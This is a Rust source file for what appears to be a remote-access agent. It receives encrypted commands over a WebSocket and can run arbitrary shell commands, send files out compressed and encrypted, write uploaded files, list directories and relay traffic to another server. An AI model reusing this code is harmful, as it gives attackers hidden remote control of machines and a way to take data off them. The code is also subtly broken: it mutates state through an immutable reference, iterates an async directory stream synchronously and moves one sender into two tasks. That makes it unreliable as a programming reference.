use std::sync::Arc;

use futures_util::stream::{SplitSink, SplitStream, StreamExt};
use tokio::fs;
use tokio::net::TcpStream;
use tokio::process::Command;
use tokio::sync::Mutex;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::WebSocketStream;
use crate::communication;
use crate::compression;
use crate::crypto;

pub struct RxCommandHandler {
    passphrase: String,
    ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    ws_receiver: Option<Arc<Mutex<SplitStream<WebSocketStream<TcpStream>>>>>,
}

impl RxCommandHandler {
    pub fn new(
        passphrase: String,
        ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
        ws_receiver: Option<Arc<Mutex<SplitStream<WebSocketStream<TcpStream>>>>>,
    ) -> Self {
        RxCommandHandler { passphrase, ws_sender, ws_receiver }
    }

    pub async fn handle_command(&self, command: &str) {
        let parts: Vec<&str> = command.split_whitespace().collect();
        let cmd = parts.get(0).unwrap_or(&"");
        let args = &parts[1..].join(" ");

        match cmd.to_uppercase().as_str() {
            "ECHO" | "PRINT" | "MSG" => self.print_message(args).await,
            "LIST" | "LS" => self.list_files().await,
            "GET" | "DOWNLOAD" => self.download_file(args).await,
            "PUT" | "UPLOAD" => self.upload_file(args).await,
            "SHELL" | "EXEC" | "RUN" => self.execute_command(args).await,
            "PASSPHRASE" => self.change_passphrase(args).await,
            "PROXY" => self.proxy_to_server(args).await,
            "EXIT" => self.exit_proxy_mode().await,
            _ => eprintln!("Unknown command: {}", command),
        }
    }

    async fn print_message(&self, message: &str) {
        println!("[+] {:?}", message);
    }

    async fn list_files(&self) {
        let entries = fs::read_dir(".").await.expect("Failed to read directory");
        let mut file_list = String::new();

        for entry in entries {
            let entry = entry.expect("Failed to read entry");
            let path = entry.path();
            if let Some(file_name) = path.file_name() {
                file_list.push_str(&format!("{}\n", file_name.to_string_lossy()));
            }
        }

        if let Some(ws_sender) = &self.ws_sender {
            let mut sender = ws_sender.lock().await;
            communication::send_binary_data(&mut sender, file_list.into_bytes()).await;
        }
    }

    async fn download_file(&self, file_path: &str) {
        match fs::read(file_path).await {
            Ok(file_data) => {
                let compressed_data = compression::compress(&file_data);
                let encrypted_data = crypto::encrypt(&compressed_data, self.passphrase.as_bytes());

                if let Some(ws_sender) = &self.ws_sender {
                    let mut sender = ws_sender.lock().await;
                    communication::send_binary_data(&mut sender, encrypted_data).await;
                }
            }
            Err(e) => eprintln!("Failed to read file {}: {}", file_path, e),
        }
    }

    async fn upload_file(&self, args: &str) {
        let mut parts = args.split_whitespace();
        let file_path = match parts.next() {
            Some(path) => path,
            None => {
                eprintln!("No file path specified for upload.");
                return;
            }
        };

        let file_data = match parts.next() {
            Some(data) => data.as_bytes().to_vec(),
            None => {
                eprintln!("No file data specified for upload.");
                return;
            }
        };

        let binary_data = communication::decrypt_binary_data(file_data, &self.passphrase);

        match fs::write(file_path, binary_data).await {
            Ok(_) => eprintln!("File {} uploaded successfully.", file_path),
            Err(e) => eprintln!("Failed to write file {}: {}", file_path, e),
        }
    }

    async fn execute_command(&self, command: &str) {
        let output = Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .await
            .expect("Failed to execute command");

        let result = String::from_utf8_lossy(&output.stdout);

        if let Some(ws_sender) = &self.ws_sender {
            let mut sender = ws_sender.lock().await;
            communication::send_message(&mut sender, &self.passphrase, &result).await;
        }
    }

    async fn change_passphrase(&self, new_passphrase: &str) {
        // Update local passphrase
        self.passphrase = new_passphrase.to_string();
    }

    async fn proxy_to_server(&self, server_address: &str) {
        let (ws_stream, _) = tokio_tungstenite::connect_async(server_address)
            .await
            .expect("Failed to connect to proxy server");

        let (proxy_sender, mut proxy_receiver) = ws_stream.split();

        if let Some(ws_sender) = &self.ws_sender {
            let mut client_sender = ws_sender.lock().await;

            tokio::spawn(async move {
                while let Some(message) = proxy_receiver.next().await {
                    if let Ok(msg) = message {
                        client_sender.send(msg).await.expect("Failed to send message to client");
                    }
                }
            });

            tokio::spawn(async move {
                while let Some(message) = client_sender.next().await {
                    if let Ok(msg) = message {
                        proxy_sender.send(msg).await.expect("Failed to send message to proxy");
                    }
                }
            });
        }
    }

    async fn exit_proxy_mode(&self) {
        // Exit proxy mode and return to the previous connection
        // This would be more complex depending on your actual connection management
    }

    pub async fn handle_responses(&mut self) {
        if let Some(ws_receiver) = &mut self.ws_receiver {
            while let Some(message) = ws_receiver.next().await {
                match message {
                    Ok(Message::Binary(data)) => {
                        self.handle_binary_response(data).await;
                    }
                    _ => eprintln!("Unexpected WebSocket message"),
                }
            }
        }
    }

    async fn handle_binary_response(&self, data: Vec<u8>) {
        let command: Vec<u8> = communication::prepare_rx(data, &self.passphrase);
        let command_str = String::from_utf8_lossy(&command);
        self.handle_command(&command_str).await;
    }
}
